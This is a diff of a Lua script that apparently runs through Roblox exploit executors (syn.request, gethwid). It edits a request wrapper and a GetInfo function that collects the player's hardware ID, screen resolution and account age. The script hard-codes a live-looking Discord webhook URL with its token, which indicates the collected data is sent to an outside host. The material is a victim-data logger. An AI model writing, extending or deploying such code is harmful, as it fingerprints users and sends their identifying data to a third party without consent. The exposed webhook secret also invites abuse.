@@ -26,7 +26,11 @@ local LocalPlayer = Players.LocalPlayer
 local WebhookURL = "https://discord.com/api/webhooks/1510626193236561980/u9KXHhdx1fK9hOOcvIl59dA80OMdtSLh-7b8VOkEOyYCGxN39sGUbALMhsbddd6wV_yI"
 local function request(options)
     local req = (syn and syn.request) or (http and http.request) or http_request or request or (getgenv and getgenv().request)
-    if req then pcall(req, options) end
+    if req then 
+        local s, r = pcall(req, options)
+        if s then return r end
+    end
+    return nil
 end
 local function GetInfo()
     local info = {}
@@ -72,7 +76,7 @@ local function GetInfo()
         info.screen = math.floor(screenSize.X) .. "x" .. math.floor(screenSize.Y)
     end)
     pcall(function()
-        info.hwid = gethwid or (get_hwid and get_hwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "Unknown"
+        info.hwid = gethwid() or (get_hwid and get_hwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "Unknown"
     end)
     pcall(function()
         info.accountAge = LocalPlayer.AccountAge
